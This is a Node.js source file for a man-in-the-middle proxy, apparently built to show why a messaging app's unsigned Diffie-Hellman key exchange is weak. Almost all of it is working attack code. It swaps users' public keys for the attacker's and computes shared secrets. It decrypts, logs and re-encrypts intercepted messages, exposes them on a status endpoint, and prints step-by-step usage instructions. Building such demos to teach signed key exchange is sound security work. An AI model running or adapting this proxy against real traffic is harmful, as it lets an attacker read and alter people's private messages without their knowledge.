// ============================================
// MITM ATTACK PROXY SERVER
// Demonstrates Man-in-the-Middle attack
// ============================================

const http = require('http');
const https = require('https');
const crypto = require('crypto');

// Configuration
const PROXY_PORT = 8888;
const TARGET_SERVER = 'http://localhost:3001'; // Your actual server

// Attacker's DH parameters (same group as legitimate users)
const attackerDH = crypto.createDiffieHellman(2048);
attackerDH.generateKeys();

// Storage for compromised sessions
const compromisedSessions = new Map();

console.log('🔴 MITM ATTACKER PROXY STARTED');
console.log(`Listening on port ${PROXY_PORT}`);
console.log(`Forwarding to ${TARGET_SERVER}`);
console.log('Configure clients to use this proxy\n');

// ============================================
// PROXY SERVER
// ============================================
const proxy = http.createServer((clientReq, clientRes) => {
  const requestBody = [];
  
  // Collect request data
  clientReq.on('data', chunk => requestBody.push(chunk));
  
  clientReq.on('end', () => {
    const body = Buffer.concat(requestBody).toString();
    
    console.log(`\n📡 Intercepted: ${clientReq.method} ${clientReq.url}`);
    
    // Check if this is a key exchange
    if (clientReq.url.includes('/api/key-exchange') || 
        clientReq.url.includes('/api/exchange-keys')) {
      handleKeyExchange(clientReq, clientRes, body);
    } 
    // Check if this is an encrypted message
    else if (clientReq.url.includes('/api/messages') || 
             clientReq.url.includes('/api/send')) {
      handleMessage(clientReq, clientRes, body);
    }
    // Forward other requests normally
    else {
      forwardRequest(clientReq, clientRes, body);
    }
  });
});

// ============================================
// KEY EXCHANGE INTERCEPTION
// ============================================
function handleKeyExchange(clientReq, clientRes, body) {
  try {
    const keyExchange = JSON.parse(body);
    
    console.log('\n🔴 KEY EXCHANGE DETECTED!');
    console.log('Original request:', JSON.stringify(keyExchange, null, 2));
    
    // Extract user information
    const userId = keyExchange.userId || keyExchange.senderId;
    const publicKey = keyExchange.publicKey || keyExchange.dhPublicKey;
    
    // Check if this has a signature (secure implementation)
    if (keyExchange.signature) {
      console.log('\n⚠️  SIGNATURE DETECTED - Secure implementation');
      console.log('Cannot perform MITM - signature verification will fail');
      console.log('Forwarding original request...\n');
      
      forwardRequest(clientReq, clientRes, body);
      return;
    }
    
    // No signature - vulnerable to MITM!
    console.log('\n✅ NO SIGNATURE - Vulnerable!');
    console.log('Performing MITM attack...\n');
    
    // Store victim's public key
    compromisedSessions.set(userId, {
      victimPublicKey: publicKey,
      timestamp: Date.now()
    });
    
    // Compute shared secret with victim
    const victimSharedSecret = attackerDH.computeSecret(
      Buffer.from(publicKey, 'base64')
    );
    
    compromisedSessions.get(userId).sharedSecret = victimSharedSecret;
    
    console.log(`🔴 Computed shared secret with ${userId}`);
    console.log(`Secret: ${victimSharedSecret.toString('hex').substring(0, 32)}...`);
    
    // Replace victim's public key with attacker's
    const modifiedExchange = {
      ...keyExchange,
      publicKey: attackerDH.getPublicKey('base64'),
      dhPublicKey: attackerDH.getPublicKey('base64')
    };
    
    console.log('\n🔴 Replaced public key with attacker\'s key');
    console.log('Modified request:', JSON.stringify(modifiedExchange, null, 2));
    
    // Forward modified request to server
    forwardModifiedRequest(clientReq, clientRes, JSON.stringify(modifiedExchange));
    
    // Log the successful attack
    logAttack(userId, 'KEY_EXCHANGE_COMPROMISED', {
      victimKey: publicKey.substring(0, 20) + '...',
      attackerKey: attackerDH.getPublicKey('base64').substring(0, 20) + '...',
      sharedSecret: victimSharedSecret.toString('hex').substring(0, 32) + '...'
    });
    
  } catch (error) {
    console.error('Error in key exchange interception:', error);
    forwardRequest(clientReq, clientRes, body);
  }
}

// ============================================
// MESSAGE INTERCEPTION
// ============================================
function handleMessage(clientReq, clientRes, body) {
  try {
    const message = JSON.parse(body);
    
    console.log('\n📨 ENCRYPTED MESSAGE DETECTED');
    
    const senderId = message.senderId || message.userId;
    const recipientId = message.recipientId || message.to;
    
    // Check if we have compromised this session
    const senderSession = compromisedSessions.get(senderId);
    const recipientSession = compromisedSessions.get(recipientId);
    
    if (!senderSession || !recipientSession) {
      console.log('⚠️  Session not compromised, forwarding...');
      forwardRequest(clientReq, clientRes, body);
      return;
    }
    
    console.log('✅ Session compromised! Attempting decryption...');
    
    // Attempt to decrypt the message
    try {
      const decrypted = decryptMessage(
        message.ciphertext,
        message.iv,
        message.tag,
        senderSession.sharedSecret
      );
      
      console.log('\n🔓 MESSAGE DECRYPTED:');
      console.log('═══════════════════════════════════════');
      console.log(decrypted);
      console.log('═══════════════════════════════════════\n');
      
      // Log the intercepted message
      logAttack(senderId, 'MESSAGE_INTERCEPTED', {
        recipient: recipientId,
        content: decrypted,
        timestamp: new Date().toISOString()
      });
      
      // Re-encrypt for recipient
      const reencrypted = encryptMessage(
        decrypted,
        recipientSession.sharedSecret
      );
      
      // Modify message with re-encrypted version
      const modifiedMessage = {
        ...message,
        ciphertext: reencrypted.ciphertext,
        iv: reencrypted.iv,
        tag: reencrypted.tag
      };
      
      console.log('🔴 Re-encrypted for recipient');
      console.log('Forwarding modified message...\n');
      
      forwardModifiedRequest(clientReq, clientRes, JSON.stringify(modifiedMessage));
      
    } catch (decryptError) {
      console.log('❌ Decryption failed:', decryptError.message);
      console.log('Possible reasons:');
      console.log('  - Message uses different encryption');
      console.log('  - Session keys rotated');
      console.log('  - Additional authentication layers');
      forwardRequest(clientReq, clientRes, body);
    }
    
  } catch (error) {
    console.error('Error in message interception:', error);
    forwardRequest(clientReq, clientRes, body);
  }
}

// ============================================
// CRYPTO HELPERS
// ============================================
function decryptMessage(ciphertext, iv, tag, sharedSecret) {
  // Derive AES key from shared secret
  const aesKey = crypto.createHash('sha256')
    .update(sharedSecret)
    .digest()
    .slice(0, 32);
  
  // Create decipher
  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    aesKey,
    Buffer.from(iv, 'hex')
  );
  
  // Set authentication tag
  if (tag) {
    decipher.setAuthTag(Buffer.from(tag, 'hex'));
  }
  
  // Decrypt
  let decrypted = decipher.update(ciphertext, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  
  return decrypted;
}

function encryptMessage(plaintext, sharedSecret) {
  // Derive AES key from shared secret
  const aesKey = crypto.createHash('sha256')
    .update(sharedSecret)
    .digest()
    .slice(0, 32);
  
  // Generate new IV
  const iv = crypto.randomBytes(12);
  
  // Create cipher
  const cipher = crypto.createCipheriv('aes-256-gcm', aesKey, iv);
  
  // Encrypt
  let encrypted = cipher.update(plaintext, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  // Get authentication tag
  const tag = cipher.getAuthTag();
  
  return {
    ciphertext: encrypted,
    iv: iv.toString('hex'),
    tag: tag.toString('hex')
  };
}

// ============================================
// REQUEST FORWARDING
// ============================================
function forwardRequest(clientReq, clientRes, body) {
  const options = {
    hostname: 'localhost',
    port: 3001,
    path: clientReq.url,
    method: clientReq.method,
    headers: clientReq.headers
  };
  
  const serverReq = http.request(options, serverRes => {
    clientRes.writeHead(serverRes.statusCode, serverRes.headers);
    serverRes.pipe(clientRes);
  });
  
  serverReq.on('error', error => {
    console.error('Server request error:', error);
    clientRes.writeHead(502);
    clientRes.end('Bad Gateway');
  });
  
  if (body) {
    serverReq.write(body);
  }
  serverReq.end();
}

function forwardModifiedRequest(clientReq, clientRes, modifiedBody) {
  const options = {
    hostname: 'localhost',
    port: 3001,
    path: clientReq.url,
    method: clientReq.method,
    headers: {
      ...clientReq.headers,
      'content-length': Buffer.byteLength(modifiedBody)
    }
  };
  
  const serverReq = http.request(options, serverRes => {
    clientRes.writeHead(serverRes.statusCode, serverRes.headers);
    serverRes.pipe(clientRes);
  });
  
  serverReq.on('error', error => {
    console.error('Server request error:', error);
    clientRes.writeHead(502);
    clientRes.end('Bad Gateway');
  });
  
  serverReq.write(modifiedBody);
  serverReq.end();
}

// ============================================
// LOGGING
// ============================================
const attackLog = [];

function logAttack(userId, type, details) {
  const entry = {
    timestamp: new Date().toISOString(),
    userId,
    type,
    details
  };
  
  attackLog.push(entry);
  
  // Write to file
  const fs = require('fs');
  fs.appendFileSync(
    'mitm-attack-log.json',
    JSON.stringify(entry, null, 2) + ',\n'
  );
}

// ============================================
// STATUS ENDPOINT
// ============================================
const statusServer = http.createServer((req, res) => {
  if (req.url === '/status') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      compromisedSessions: Array.from(compromisedSessions.keys()),
      interceptedMessages: attackLog.length,
      attackLog: attackLog.slice(-10) // Last 10 attacks
    }, null, 2));
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

// Start servers
proxy.listen(PROXY_PORT, () => {
  console.log(`\n🔴 MITM Proxy listening on http://localhost:${PROXY_PORT}`);
  console.log('Configure your clients to use this proxy:\n');
  console.log('  export HTTP_PROXY=http://localhost:8888');
  console.log('  export HTTPS_PROXY=http://localhost:8888\n');
});

statusServer.listen(9999, () => {
  console.log('📊 Status server: http://localhost:9999/status\n');
});

// ============================================
// USAGE INSTRUCTIONS
// ============================================
console.log('═══════════════════════════════════════════════════');
console.log('USAGE INSTRUCTIONS:');
console.log('═══════════════════════════════════════════════════');
console.log('1. Start this MITM proxy: node mitm-attacker.js');
console.log('2. Configure clients to use proxy (modify API URLs)');
console.log('3. Perform key exchange between users');
console.log('4. Send messages and observe decryption');
console.log('5. Check attack log: mitm-attack-log.json');
console.log('6. View status: http://localhost:9999/status');
console.log('═══════════════════════════════════════════════════\n');